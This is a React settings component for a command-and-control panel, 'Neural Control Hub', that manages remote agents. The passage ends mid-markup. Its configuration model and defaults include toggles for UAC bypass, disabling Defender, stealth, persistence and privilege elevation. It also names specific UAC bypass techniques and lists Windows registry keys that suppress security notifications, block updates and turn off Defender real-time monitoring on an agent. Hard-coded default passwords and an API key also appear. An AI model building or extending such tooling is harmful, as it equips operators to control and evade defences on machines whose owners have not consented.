import { useEffect, useState } from 'react';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from './ui/card';
import { Button } from './ui/button';
import { Input } from './ui/input';
import { Label } from './ui/label';
import { Switch } from './ui/switch';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from './ui/select';
import { Separator } from './ui/separator';
import { Badge } from './ui/badge';
import { Alert, AlertDescription } from './ui/alert';
import { Textarea } from './ui/textarea';
import { Tabs, TabsContent, TabsList, TabsTrigger } from './ui/tabs';
import { useTheme } from './ThemeProvider';
import { useSocket } from './SocketProvider';
import { 
  Settings as SettingsIcon,
  Monitor,
  Sun,
  Moon,
  Bell,
  Shield,
  Network,
  Key,
  Download,
  Upload,
  Trash2,
  Save,
  RefreshCw,
  AlertTriangle,
  CheckCircle,
  Info,
  Lock,
  Server,
  Mail,
  Eye,
  EyeOff,
  Users,
  Zap,
  Activity,
  Copy,
  LogOut,
} from 'lucide-react';
import { toast } from 'sonner';

interface C2Settings {
  server: {
    controllerUrl: string;
    serverPort: number;
    sslEnabled: boolean;
    maxAgents: number;
    heartbeatInterval: number;
    commandTimeout: number;
    autoReconnect: boolean;
    backupUrl: string;
  };
  authentication: {
    adminPassword: string;
    operatorPassword: string;
    sessionTimeout: number;
    maxLoginAttempts: number;
    requireTwoFactor: boolean;
    apiKeyEnabled: boolean;
    apiKey: string;
  };
  email: {
    enabled: boolean;
    smtpServer: string;
    smtpPort: number;
    username: string;
    password: string;
    recipient: string;
    enableTLS: boolean;
    notifyAgentOnline: boolean;
    notifyAgentOffline: boolean;
    notifyCommandFailure: boolean;
    notifySecurityAlert: boolean;
  };
  agent: {
    defaultPersistence: boolean;
    enableUACBypass: boolean;
    enableDefenderDisable: boolean;
    enableAdvancedPersistence: boolean;
    silentMode: boolean;
    quickStartup: boolean;
    enableStealth: boolean;
    autoElevatePrivileges: boolean;
    maxPromptAttempts: number;
    uacBypassDebug: boolean;
    persistentAdminPrompt: boolean;
  };
  webrtc: {
    enabled: boolean;
    iceServers: string[];
    maxBitrate: number;
    adaptiveBitrate: boolean;
    frameDropping: boolean;
    qualityLevel: string;
    monitoringEnabled: boolean;
  };
  security: {
    encryptCommunication: boolean;
    validateCertificates: boolean;
    allowSelfSigned: boolean;
    rateLimitEnabled: boolean;
    rateLimitRequests: number;
    rateLimitWindow: number;
    ipBlockingEnabled: boolean;
    blockedIps: string[];
  };
  bypasses?: {
    enabled: boolean;
    methods?: Record<string, boolean>;
  };
  registry?: {
    enabled: boolean;
    notificationsEnabled?: boolean;
    actions?: Record<string, boolean>;
  };
}

export function Settings() {
  const { theme, setTheme } = useTheme();
  const { logout, agents, selectedAgent, setSelectedAgent, sendCommand, registryPresence, checkRegistryPresence } = useSocket();
  const [showPasswords, setShowPasswords] = useState({
    admin: false,
    operator: false,
    email: false,
    api: false
  });
  const [newBlockedIp, setNewBlockedIp] = useState('');
  
  const [settings, setSettings] = useState<C2Settings>({
    server: {
      controllerUrl: 'https://localhost:8080',
      serverPort: 8080,
      sslEnabled: true,
      maxAgents: 100,
      heartbeatInterval: 30,
      commandTimeout: 30,
      autoReconnect: true,
      backupUrl: ''
    },
    authentication: {
      adminPassword: 'admin123!',
      operatorPassword: 'operator123!',
      sessionTimeout: 30,
      maxLoginAttempts: 3,
      requireTwoFactor: false,
      apiKeyEnabled: true,
      apiKey: 'neural-hub-api-key-2024'
    },
    email: {
      enabled: false,
      smtpServer: 'smtp.gmail.com',
      smtpPort: 587,
      username: '',
      password: '',
      recipient: '',
      enableTLS: true,
      notifyAgentOnline: true,
      notifyAgentOffline: true,
      notifyCommandFailure: true,
      notifySecurityAlert: true
    },
    agent: {
      defaultPersistence: false,
      enableUACBypass: false,
      enableDefenderDisable: false,
      enableAdvancedPersistence: false,
      silentMode: true,
      quickStartup: false,
      enableStealth: false,
      autoElevatePrivileges: false,
      maxPromptAttempts: 3,
      uacBypassDebug: false,
      persistentAdminPrompt: false
    },
    webrtc: {
      enabled: true,
      iceServers: [
        'stun:stun.l.google.com:19302',
        'stun:stun1.l.google.com:19302'
      ],
      maxBitrate: 5000000,
      adaptiveBitrate: true,
      frameDropping: true,
      qualityLevel: 'auto',
      monitoringEnabled: true
    },
    security: {
      encryptCommunication: true,
      validateCertificates: false,
      allowSelfSigned: true,
      rateLimitEnabled: true,
      rateLimitRequests: 100,
      rateLimitWindow: 60,
      ipBlockingEnabled: false,
      blockedIps: []
    },
    bypasses: {
      enabled: false,
      methods: {
        cleanmgr_sagerun: false,
        fodhelper: false,
        computerdefaults: false,
        eventvwr: false,
        sdclt: false,
        wsreset: false,
        slui: false,
        winsat: false,
        silentcleanup: false,
        icmluautil: false,
        runas_prompt: false
      }
    },
    registry: {
      enabled: false,
      notificationsEnabled: false,
      actions: {
        policy_push_notifications: false,
        policy_windows_update: false,
        context_runas_cmd: false,
        context_powershell_admin: false,
        notify_center_hkcu: false,
        notify_center_hklm: false,
        defender_ux_suppress: false,
        toast_global_above_lock: false,
        toast_global_critical_above_lock: false,
        toast_windows_update: false,
        toast_security_maintenance: false,
        toast_windows_security: false,
        toast_sec_health_ui: false,
        explorer_balloon_tips: false,
        explorer_info_tip: false,
        disableRealtimeMonitoring: false,
      }
    }
  });

  const [hasChanges, setHasChanges] = useState(false);
  const [saved, setSaved] = useState(false);
  const [activeTab, setActiveTab] = useState(() => {
    try { return localStorage.getItem('nch:tab:settings') || 'server'; } catch { return 'server'; }
  });
  const [trustedDevice, setTrustedDevice] = useState(false);
  const [currentAdminPassword, setCurrentAdminPassword] = useState('');
  const [newAdminPassword, setNewAdminPassword] = useState('');
  const [confirmAdminPassword, setConfirmAdminPassword] = useState('');
  const [totpStatus, setTotpStatus] = useState<{ enabled: boolean; enrolled: boolean; issuer: string }>({
    enabled: false,
    enrolled: false,
    issuer: ''
  });

  const registryActionList: Array<{ id: string; actionKey: keyof NonNullable<NonNullable<C2Settings['registry']>['actions']>; label: string; hive: string; path: string; key: string }> = [
    { id: 'policy_push_notifications', actionKey: 'policy_push_notifications', label: 'Policy Push Notifications', hive: 'HKLM', path: 'SOFTWARE\\Policies\\Microsoft\\Windows\\PushNotifications', key: 'NoCloudApplicationNotification' },
    { id: 'policy_windows_update', actionKey: 'policy_windows_update', label: 'Policy Windows Update', hive: 'HKLM', path: 'SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate', key: 'DisableOSUpgrade' },
    { id: 'context_runas_cmd', actionKey: 'context_runas_cmd', label: 'Context Runas CMD', hive: 'HKCU', path: 'Software\\Classes\\Directory\\Background\\shell\\runas_cmd', key: '' },
    { id: 'context_powershell_admin', actionKey: 'context_powershell_admin', label: 'Context PowerShell Admin', hive: 'HKCU', path: 'Software\\Classes\\Directory\\Background\\shell\\powershell_admin', key: '' },
    { id: 'notify_center_hkcu', actionKey: 'notify_center_hkcu', label: 'Notification Center (HKCU)', hive: 'HKCU', path: 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\PushNotifications', key: 'ToastEnabled' },
    { id: 'notify_center_hklm', actionKey: 'notify_center_hklm', label: 'Notification Center (HKLM)', hive: 'HKLM', path: 'SOFTWARE\\Policies\\Microsoft\\Windows\\PushNotifications', key: 'NoCloudApplicationNotification' },
    { id: 'defender_ux_suppress', actionKey: 'defender_ux_suppress', label: 'Defender UX Suppress', hive: 'HKLM', path: 'SOFTWARE\\Policies\\Microsoft\\Windows Defender\\UX Configuration', key: 'Notification_Suppress' },
    { id: 'toast_global_above_lock', actionKey: 'toast_global_above_lock', label: 'Toast Global Above Lock', hive: 'HKLM', path: 'SOFTWARE\\Policies\\Microsoft\\Windows\\System', key: 'DisableLockScreenAppNotifications' },
    { id: 'toast_global_critical_above_lock', actionKey: 'toast_global_critical_above_lock', label: 'Toast Global Critical Above Lock', hive: 'HKLM', path: 'SOFTWARE\\Policies\\Microsoft\\Windows\\System', key: 'EnableLockScreenAppNotifications' },
    { id: 'toast_windows_update', actionKey: 'toast_windows_update', label: 'Toast Windows Update', hive: 'HKLM', path: 'SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate', key: 'DoNotConnectToWindowsUpdateInternetLocations' },
    { id: 'toast_security_maintenance', actionKey: 'toast_security_maintenance', label: 'Toast Security & Maintenance', hive: 'HKLM', path: 'SOFTWARE\\Policies\\Microsoft\\Windows\\SecurityHealth', key: 'SuppressNotifications' },
    { id: 'toast_windows_security', actionKey: 'toast_windows_security', label: 'Toast Windows Security', hive: 'HKLM', path: 'SOFTWARE\\Microsoft\\Windows Defender Security Center\\Notifications', key: 'EnableNotifications' },
    { id: 'toast_sec_health_ui', actionKey: 'toast_sec_health_ui', label: 'Toast Security Health UI', hive: 'HKLM', path: 'SOFTWARE\\Policies\\Microsoft\\Windows\\SecurityHealth', key: 'SuppressNotifications' },
    { id: 'explorer_balloon_tips', actionKey: 'explorer_balloon_tips', label: 'Explorer Balloon Tips', hive: 'HKCU', path: 'Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced', key: 'EnableBalloonTips' },
    { id: 'explorer_info_tip', actionKey: 'explorer_info_tip', label: 'Explorer Info Tip', hive: 'HKCU', path: 'Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced', key: 'ShowInfoTip' },
    { id: 'disableRealtimeMonitoring', actionKey: 'disableRealtimeMonitoring', label: 'Defender Disable Realtime Monitoring', hive: 'HKLM', path: 'SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection', key: 'DisableRealtimeMonitoring' },
  ];

  useEffect(() => {
    try {
      const agentId = selectedAgent;
      if (!agentId) return;
      const items = registryActionList.map(x => ({ id: x.id, hive: x.hive, path: x.path, key: x.key }));
      checkRegistryPresence(agentId, items);
    } catch {}
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [selectedAgent]);

  const updateSetting = (category: keyof C2Settings, key: string, value: any) => {
    setSettings(prev => ({
      ...prev,
      [category]: {
        ...prev[category],
        [key]: value
      }
    }));
    setHasChanges(true);
    setSaved(false);
  };

  const saveSettings = async () => {
    try {
      const payload: C2Settings = {
        ...settings,
        agent: {
          ...settings.agent,
          defaultPersistence: false,
          enableUACBypass: false,
          enableDefenderDisable: false,
          enableAdvancedPersistence: false,
          enableStealth: false,
          autoElevatePrivileges: false,
          uacBypassDebug: false,
          persistentAdminPrompt: false,
        },
        bypasses: {
          enabled: false,
          methods: {
            cleanmgr_sagerun: false,
            fodhelper: false,
            computerdefaults: false,
            eventvwr: false,
            sdclt: false,
            wsreset: false,
            slui: false,
            winsat: false,
            silentcleanup: false,
            icmluautil: false,
            runas_prompt: false,
          },
        },
        registry: {
          enabled: false,
          notificationsEnabled: false,
          actions: {
            policy_push_notifications: false,
            policy_windows_update: false,
            context_runas_cmd: false,
            context_powershell_admin: false,
            notify_center_hkcu: false,
            notify_center_hklm: false,
            defender_ux_suppress: false,
            toast_global_above_lock: false,
            toast_global_critical_above_lock: false,
            toast_windows_update: false,
            toast_security_maintenance: false,
            toast_windows_security: false,
            toast_sec_health_ui: false,
            explorer_balloon_tips: false,
            explorer_info_tip: false,
            disableRealtimeMonitoring: false,
          },
        },
      };
      const res = await fetch('/api/settings', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
      const data = await res.json();
      if (!res.ok || data.success === false) throw new Error(data.message || 'Save failed');
      setSettings(payload);
      setHasChanges(false);
      setSaved(true);
      toast.success(data.message || 'Settings saved successfully');
      if (data?.restart_required) {
        toast.info('Some changes require a server restart to take effect');
      }
      setTimeout(() => setSaved(false), 3000);
    } catch (e: any) {
      toast.error(e.message || 'Failed to save settings');
    }
  };

  useEffect(() => {
    const load = async () => {
      try {
        const res = await fetch('/api/settings');
        const data = await res.json();
        if (!res.ok) throw new Error('Failed to load settings');
        setSettings(prev => ({
          ...prev,
          server: {
            ...prev.server,
            controllerUrl: data?.server?.controllerUrl ?? prev.server.controllerUrl,
            serverPort: data?.server?.serverPort ?? prev.server.serverPort,
            sslEnabled: data?.server?.sslEnabled ?? prev.server.sslEnabled,
            maxAgents: data?.server?.maxAgents ?? prev.server.maxAgents,
            heartbeatInterval: data?.server?.heartbeatInterval ?? prev.server.heartbeatInterval,
            commandTimeout: data?.server?.commandTimeout ?? prev.server.commandTimeout,
            autoReconnect: data?.server?.autoReconnect ?? prev.server.autoReconnect,
            backupUrl: data?.server?.backupUrl ?? prev.server.backupUrl,
          },
          authentication: {
            ...prev.authentication,
            operatorPassword: data?.authentication?.operatorPassword ?? prev.authentication.operatorPassword,
            sessionTimeout: data?.authentication?.sessionTimeout ?? prev.authentication.sessionTimeout,
            maxLoginAttempts: data?.authentication?.maxLoginAttempts ?? prev.authentication.maxLoginAttempts,
            requireTwoFactor: data?.authentication?.requireTwoFactor ?? prev.authentication.requireTwoFactor,
            apiKeyEnabled: data?.authentication?.apiKeyEnabled ?? prev.authentication.apiKeyEnabled,
            apiKey: data?.authentication?.apiKey ?? prev.authentication.apiKey,
          },
          email: {
            ...prev.email,
            enabled: data?.email?.enabled ?? prev.email.enabled,
            smtpServer: data?.email?.smtpServer ?? prev.email.smtpServer,
            smtpPort: data?.email?.smtpPort ?? prev.email.smtpPort,
            username: data?.email?.username ?? prev.email.username,
            password: data?.email?.password ?? prev.email.password,
            recipient: data?.email?.recipient ?? prev.email.recipient,
            enableTLS: data?.email?.enableTLS ?? prev.email.enableTLS,
            notifyAgentOnline: data?.email?.notifyAgentOnline ?? prev.email.notifyAgentOnline,
            notifyAgentOffline: data?.email?.notifyAgentOffline ?? prev.email.notifyAgentOffline,
            notifyCommandFailure: data?.email?.notifyCommandFailure ?? prev.email.notifyCommandFailure,
            notifySecurityAlert: data?.email?.notifySecurityAlert ?? prev.email.notifySecurityAlert,
          },
          agent: {
            ...prev.agent,
            ...data?.agent,
            defaultPersistence: false,
            enableUACBypass: false,
            enableDefenderDisable: false,
            enableAdvancedPersistence: false,
            enableStealth: false,
            autoElevatePrivileges: false,
            uacBypassDebug: false,
            persistentAdminPrompt: false,
          },
          webrtc: {
            ...prev.webrtc,
            ...data?.webrtc,
          },
          security: {
            ...prev.security,
            ...data?.security,
          },
          bypasses: {
            enabled: false,
            methods: {
              cleanmgr_sagerun: false,
              fodhelper: false,
              computerdefaults: false,
              eventvwr: false,
              sdclt: false,
              wsreset: false,
              slui: false,
              winsat: false,
              silentcleanup: false,
              icmluautil: false,
              runas_prompt: false,
            }
          },
          registry: {
            enabled: false,
            notificationsEnabled: false,
            actions: {
              policy_push_notifications: false,
              policy_windows_update: false,
              context_runas_cmd: false,
              context_powershell_admin: false,
              notify_center_hkcu: false,
              notify_center_hklm: false,
              defender_ux_suppress: false,
              toast_global_above_lock: false,
              toast_global_critical_above_lock: false,
              toast_windows_update: false,
              toast_security_maintenance: false,
              toast_windows_security: false,
              toast_sec_health_ui: false,
              explorer_balloon_tips: false,
              explorer_info_tip: false,
              disableRealtimeMonitoring: false,
            }
          },
        }));
        try {
          const tRes = await fetch('/api/auth/device/trust-status');
          const tData = await tRes.json();
          if (tRes.ok) {
            setTrustedDevice(Boolean(tData?.trusted));
          }
        } catch (_e) {}
        try {
          const tfRes = await fetch('/api/auth/totp/status');
          const tfData = await tfRes.json();
          if (tfRes.ok) {
            setTotpStatus({
              enabled: Boolean(tfData?.enabled),
              enrolled: Boolean(tfData?.enrolled),
              issuer: tfData?.issuer ?? ''
            });
          }
        } catch (_e) {}
      } catch (e: any) {
        toast.error(e.message || 'Failed to load settings');
      }
    };
    load();
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  const exportSettings = () => {
    const dataStr = JSON.stringify(settings, null, 2);
    const dataBlob = new Blob([dataStr], { type: 'application/json' });
    const url = URL.createObjectURL(dataBlob);
    const link = document.createElement('a');
    link.href = url;
    link.download = 'neural-control-hub-config.json';
    link.click();
    toast.success("Settings exported successfully");
  };

  const generateApiKey = () => {
    const newKey = 'neural-hub-' + Math.random().toString(36).substr(2, 16);
    updateSetting('authentication', 'apiKey', newKey);
    toast.success("New API key generated");
  };

  const copyToClipboard = (text: string, label: string) => {
    navigator.clipboard.writeText(text);
    toast.success(`${label} copied to clipboard`);
  };

  const handleLogout = async () => {
    try {
      await logout();
    } catch (error) {
      console.error('Logout failed:', error);
    }
  };

  const togglePasswordVisibility = (field: keyof typeof showPasswords) => {
    setShowPasswords(prev => ({
      ...prev,
      [field]: !prev[field]
    }));
  };
  
  const changeAdminPassword = async () => {
    try {
      if (!currentAdminPassword || !newAdminPassword) {
        throw new Error('Enter current and new password');
      }
      if (newAdminPassword !== confirmAdminPassword) {
        throw new Error('New passwords do not match');
      }
      const res = await fetch('/change-password', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          current_password: currentAdminPassword,
          new_password: newAdminPassword
        })
      });
      const data = await res.json();
      if (!res.ok || data.success === false) throw new Error(data.message || 'Change failed');
      toast.success('Admin password changed');
      setCurrentAdminPassword('');
      setNewAdminPassword('');
      setConfirmAdminPassword('');
    } catch (e: any) {
      toast.error(e.message || 'Failed to change password');
    }
  };
  
  const toggleTrustedDevice = async (checked: boolean) => {
    try {
      const res = await fetch('/api/auth/device/trust', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ trust: checked })
      });
      const data = await res.json();
      if (!res.ok || data.success === false) throw new Error(data.message || 'Operation failed');
      setTrustedDevice(Boolean(data?.trusted));
      toast.success(checked ? 'Device trusted' : 'Device untrusted');
    } catch (e: any) {
      toast.error(e.message || 'Failed to update device trust');
    }
  };

  return (
    <div className="space-y-6 p-6">
      {/* Header */}
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-3xl font-bold">C2 Controller Settings</h1>
          <p className="text-muted-foreground mt-2">Configure your Neural Control Hub server and agents</p>
        </div>
        <div className="flex items-center space-x-2">
          {hasChanges && (
            <Badge variant="secondary" className="animate-pulse">
              Unsaved Changes
            </Badge>
          )}
          {saved && (
            <Badge variant="default" className="bg-green-600">
              <CheckCircle className="h-3 w-3 mr-1" />
              Saved
            </Badge>
          )}
          <Button 
            onClick={saveSettings} 
            disabled={!hasChanges}
            className="flex items-center space-x-2"
          >
            <Save className="h-4 w-4" />
            <span>Save All</span>
          </Button>
          <Button 
            onClick={handleLogout}
            variant="outline"
            className="flex items-center space-x-2 text-red-600 hover:text-red-700 hover:bg-red-50"
          >
            <LogOut className="h-4 w-4" />
            <span>Logout</span>
          </Button>
        </div>
      </div>

      {/* Settings Tabs */}
      <Tabs value={activeTab} onValueChange={(v) => { setActiveTab(v); try { localStorage.setItem('nch:tab:settings', v); } catch {} }} className="space-y-6">
        <TabsList className="grid grid-cols-2 lg:grid-cols-7 h-auto p-1">
          <TabsTrigger value="server" className="flex flex-col items-center gap-1 py-3">
            <Server className="h-4 w-4" />
            <span className="text-xs">Server</span>
          </TabsTrigger>
          <TabsTrigger value="auth" className="flex flex-col items-center gap-1 py-3">
            <Key className="h-4 w-4" />
            <span className="text-xs">Auth</span>
          </TabsTrigger>
          <TabsTrigger value="email" className="flex flex-col items-center gap-1 py-3">
            <Mail className="h-4 w-4" />
            <span className="text-xs">Email</span>
          </TabsTrigger>
          <TabsTrigger value="agents" className="flex flex-col items-center gap-1 py-3">
            <Users className="h-4 w-4" />
            <span className="text-xs">Agents</span>
          </TabsTrigger>
          <TabsTrigger value="security" className="flex flex-col items-center gap-1 py-3">
            <Shield className="h-4 w-4" />
            <span className="text-xs">Security</span>
          </TabsTrigger>
          <TabsTrigger value="advanced" className="flex flex-col items-center gap-1 py-3">
            <SettingsIcon className="h-4 w-4" />
            <span className="text-xs">Advanced</span>
          </TabsTrigger>
          {/* Bypasses moved to main tablist; removed from settings */}
        </TabsList>

        {/* Server Configuration */}
        <TabsContent value="server" className="space-y-6">
          <Card>
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                <Server className="h-5 w-5" />
                Server Configuration
              </CardTitle>
              <CardDescription>
                Configure the main C2 server settings and connection parameters
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div className="space-y-2">
                  <Label htmlFor="controller-url">Controller URL</Label>
                  <div className="flex gap-2">
                    <Input
                      id="controller-url"
                      value={settings.server.controllerUrl}
                      onChange={(e) => updateSetting('server', 'controllerUrl', e.target.value)}
                      placeholder="https://localhost:8080"
                    />
                    <Button
                      variant="outline"
                      size="sm"
                      onClick={() => copyToClipboard(settings.server.controllerUrl, 'Controller URL')}
                    >
                      <Copy className="h-4 w-4" />
                    </Button>
                  </div>
                </div>
                <div className="space-y-2">
                  <Label htmlFor="server-port">Server Port</Label>
                  <Input
                    id="server-port"
                    type="number"
                    value={settings.server.serverPort}
                    onChange={(e) => updateSetting('server', 'serverPort', parseInt(e.target.value))}
                    min="1024"
                    max="65535"
                  />
                </div>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div className="space-y-2">
                  <Label htmlFor="max-agents">Maximum Agents</Label>
                  <Input
                    id="max-agents"
                    type="number"
                    value={settings.server.maxAgents}
                    onChange={(e) => updateSetting('server', 'maxAgents', parseInt(e.target.value))}
                    min="1"
                    max="1000"
                  />
                </div>
                <div className="space-y-2">
                  <Label htmlFor="heartbeat">Heartbeat Interval (seconds)</Label>
                  <Input
                    id="heartbeat"
                    type="number"
                    value={settings.server.heartbeatInterval}
                    onChange={(e) => updateSetting('server', 'heartbeatInterval', parseInt(e.target.value))}
                    min="5"
                    max="300"
                  />
                </div>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div className="flex items-center justify-between">
                  <Label htmlFor="ssl-enabled">Enable SSL/TLS</Label>
                  <Switch
                    id="ssl-enabled"
                    checked={settings.server.sslEnabled}
                    onCheckedChange={(checked) => updateSetting('server', 'sslEnabled', checked)}
                  />
                </div>
                <div className="flex items-center justify-between">
                  <Label htmlFor="auto-reconnect">Auto-reconnect Agents</Label>
                  <Switch
                    id="auto-reconnect"
                    checked={settings.server.autoReconnect}
                    onCheckedChange={(checked) => updateSetting('server', 'autoReconnect', checked)}
                  />
                </div>
              </div>

              <div className="space-y-2">
                <Label htmlFor="backup-url">Backup Controller URL (Optional)</Label>
                <Input
                  id="backup-url"
                  value={settings.server.backupUrl}
                  onChange={(e) => updateSetting('server', 'backupUrl', e.target.value)}
                  placeholder="https://backup.example.com:8080"
                />
              </div>
            </CardContent>
          </Card>
        </TabsContent>

        {/* Authentication */}
        <TabsContent value="auth" className="space-y-6">
          <Card>
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                <Key className="h-5 w-5" />
                Authentication & Access Control
              </CardTitle>
              <CardDescription>
                Manage passwords, API keys, and access control settings
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <Alert>
                <AlertTriangle className="h-4 w-4" />
                <AlertDescription>
                  Strong passwords are essential for C2 security. Use complex passwords with mixed case, numbers, and symbols.
                </AlertDescription>
              </Alert>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div className="space-y-2">
                  <Label htmlFor="admin-password">Administrator Password</Label>
                  <div className="flex gap-2">
                    <Input
                      id="admin-password"
                      type={showPasswords.admin ? "text" : "password"}
                      value={settings.authentication.adminPassword}
                      onChange={(e) => updateSetting('authentication', 'adminPassword', e.target.value)}
                    />
                    <Button
                      variant="outline"
                      size="sm"
                      onClick={() => togglePasswordVisibility('admin')}
                    >
                      {showPasswords.admin ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
                    </Button>
                  </div>
                </div>
                <div className="space-y-2">
                  <Label htmlFor="operator-password">Operator Password</Label>
                  <div className="flex gap-2">
                    <Input
                      id="operator-password"
                      type={showPasswords.operator ? "text" : "password"}
                      value={settings.authentication.operatorPassword}
                      onChange={(e) => updateSetting('authentication', 'operatorPassword', e.target.value)}
                    />
                    <Button
                      variant="outline"
                      size="sm"
                      onClick={() => togglePasswordVisibility('operator')}
                    >
                      {showPasswords.operator ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
                    </Button>
                  </div>
                </div>
              </div>
              
              <Separator />
              <div className="space-y-2">
                <Label>Change Admin Password</Label>
                <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                  <Input
                    placeholder="Current password"
                    type="password"
                    value={currentAdminPassword}
                    onChange={(e) => setCurrentAdminPassword(e.target.value)}
                  />
                  <Input
                    placeholder="New password"
                    type="password"
                    value={newAdminPassword}
                    onChange={(e) => setNewAdminPassword(e.target.value)}
                  />
                  <Input
                    placeholder="Confirm new password"
                    type="password"
                    value={confirmAdminPassword}
                    onChange={(e) => setConfirmAdminPassword(e.target.value)}
                  />
                </div>
                <div className="flex">
                  <Button onClick={changeAdminPassword} className="flex items-center space-x-2">
                    <Lock className="h-4 w-4" />
                    <span>Change Admin Password</span>
                  </Button>
                </div>
              </div>

              <div className="space-y-2">
                <Label htmlFor="api-key">API Key</Label>
                <div className="flex gap-2">
                  <Input
                    id="api-key"
                    type={showPasswords.api ? "text" : "password"}
                    value={settings.authentication.apiKey}
                    onChange={(e) => updateSetting('authentication', 'apiKey', e.target.value)}
                    readOnly
                  />
                  <Button
                    variant="outline"
                    size="sm"
                    onClick={() => togglePasswordVisibility('api')}
                  >
                    {showPasswords.api ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
                  </Button>
                  <Button
                    variant="outline"
                    size="sm"
                    onClick={generateApiKey}
                  >
                    <RefreshCw className="h-4 w-4" />
                  </Button>
                  <Button
                    variant="outline"
                    size="sm"
                    onClick={() => copyToClipboard(settings.authentication.apiKey, 'API Key')}
                  >
                    <Copy className="h-4 w-4" />
                  </Button>
                </div>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div className="space-y-2">
                  <Label htmlFor="session-timeout">Session Timeout (minutes)</Label>
                  <Input
                    id="session-timeout"
                    type="number"
                    value={settings.authentication.sessionTimeout}
                    onChange={(e) => updateSetting('authentication', 'sessionTimeout', parseInt(e.target.value))}
                    min="5"
                    max="1440"
                  />
                </div>
                <div className="space-y-2">
                  <Label htmlFor="max-login-attempts">Max Login Attempts</Label>
                  <Input
                    id="max-login-attempts"
                    type="number"
                    value={settings.authentication.maxLoginAttempts}
                    onChange={(e) => updateSetting('authentication', 'maxLoginAttempts', parseInt(e.target.value))}
                    min="1"
                    max="10"
                  />
                </div>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div className="flex items-center justify-between">
                  <Label htmlFor="two-factor">Two-Factor Authentication</Label>
                  <Switch
                    id="two-factor"
                    checked={settings.authentication.requireTwoFactor}
                    onCheckedChange={(checked) => updateSetting('authentication', 'requireTwoFactor', checked)}   
                  />
                </div>
                {totpStatus.enabled && (
                  <div className="flex items-center justify-between">
                    <Label>Enrollment Status</Label>
                    <Badge>
                      {totpStatus.enrolled ? 'Enrolled' : 'Not enrolled'}
                    </Badge>
                  </div>
                )}
                <div className="flex items-center justify-between">
                  <Label htmlFor="trusted-device">Trust this device</Label>
                  <Switch
                    id="trusted-device"
                    checked={trustedDevice}
                    onCheckedChange={(checked) => toggleTrustedDevice(checked)}
                  />
                </div>
                <div className="flex items-center justify-between">
                  <Label htmlFor="api-key-enabled">Enable API Key Access</Label>
                  <Switch
                    id="api-key-enabled"
                    checked={settings.authentication.apiKeyEnabled}
                    onCheckedChange={(checked) => updateSetting('authentication', 'apiKeyEnabled', checked)}
                  />
                </div>
              </div>
            </CardContent>
          </Card>
        </TabsContent>

        {/* Email Notifications */}
        <TabsContent value="email" className="space-y-6">
          <Card>
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                <Mail className="h-5 w-5" />
                Email Notifications
              </CardTitle>
              <CardDescription>
                Configure email alerts for agent events and security notifications
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="flex items-center justify-between">
                <Label htmlFor="email-enabled">Enable Email Notifications</Label>
                <Switch
                  id="email-enabled"
                  checked={settings.email.enabled}
                  onCheckedChange={(checked) => updateSetting('email', 'enabled', checked)}
                />
              </div>

              {settings.email.enabled && (
                <>
                  <Separator />
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <div className="space-y-2">
                      <Label htmlFor="smtp-server">SMTP Server</Label>
                      <Input
                        id="smtp-server"
                        value={settings.email.smtpServer}
                        onChange={(e) => updateSetting('email', 'smtpServer', e.target.value)}
                        placeholder="smtp.gmail.com"
                      />
                    </div>
                    <div className="space-y-2">
                      <Label htmlFor="smtp-port">SMTP Port</Label>
                      <Input
                        id="smtp-port"
                        type="number"
                        value={settings.email.smtpPort}
                        onChange={(e) => updateSetting('email', 'smtpPort', parseInt(e.target.value))}
                        min="25"
                        max="65535"
                      />
                    </div>
                  </div>

                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <div className="space-y-2">
                      <Label htmlFor="email-username">Email Username</Label>
                      <Input
                        id="email-username"
                        value={settings.email.username}
                        onChange={(e) => updateSetting('email', 'username', e.target.value)}
                        placeholder="your-email@gmail.com"
                      />
                    </div>
                    <div className="space-y-2">
                      <Label htmlFor="email-password">Email Password / App Password</Label>
                      <div className="flex gap-2">
                        <Input
                          id="email-password"
                          type={showPasswords.email ? "text" : "password"}
                          value={settings.email.password}
                          onChange={(e) => updateSetting('email', 'password', e.target.value)}
                          placeholder="Use App Password for Gmail"
                        />
                        <Button
                          variant="outline"
                          size="sm"
                          onClick={() => togglePasswordVisibility('email')}
                        >
                          {showPasswords.email ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
                        </Button>
                      </div>
                    </div>
                  </div>

                  <div className="space-y-2">
                    <Label htmlFor="recipient">Notification Recipient</Label>
                    <Input
                      id="recipient"
                      value={settings.email.recipient}
